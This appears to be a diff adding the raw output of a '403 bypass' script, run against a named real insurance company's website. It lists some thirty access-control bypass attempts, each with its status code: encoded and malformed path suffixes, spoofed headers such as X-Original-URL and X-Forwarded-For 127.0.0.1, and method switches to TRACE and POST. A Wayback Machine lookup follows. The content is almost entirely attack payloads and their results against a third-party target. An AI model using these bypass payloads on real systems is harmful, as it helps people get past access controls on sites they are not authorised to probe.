@@ -1,0 +1,36 @@
+ ./bypass-403.sh https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml
+./bypass-403.sh: line 2: figlet: command not found
+                                               By Iam_J0ker
+./bypass-403.sh https://example.com path
+ 
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/%2e/
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml//.
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml////
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/.//./
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -H X-Original-URL: 
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -H X-Custom-IP-Authorization: 127.0.0.1
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -H X-Forwarded-For: http://127.0.0.1
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -H X-Forwarded-For: 127.0.0.1:80
+200,27595  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml -H X-rewrite-url: 
+200,8945  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/%20
+400,324  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/%09
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/?
+404,705  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/.html
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml//?anything
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/#
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -H Content-Length:0 -X POST
+200,8946  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml//*
+404,704  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/.php
+403,381  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/.json
+403,381  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/  -X TRACE
+404,700  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -H X-Host: 127.0.0.1
+403,381  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/..;/
+000,0  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/;/
+403,381  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -X TRACE
+403,381  --> https://www.desjardinsassurancevie.com:443/sitemap_mobile0.xml/ -H X-Forwarded-Host: 127.0.0.1
+Way back machine:
+{
+  "available": true,
+  "url": "http://web.archive.org/web/20240117172710/https://www.desjardinsassurancevie.com/sitemap_mobile0.xml"
+
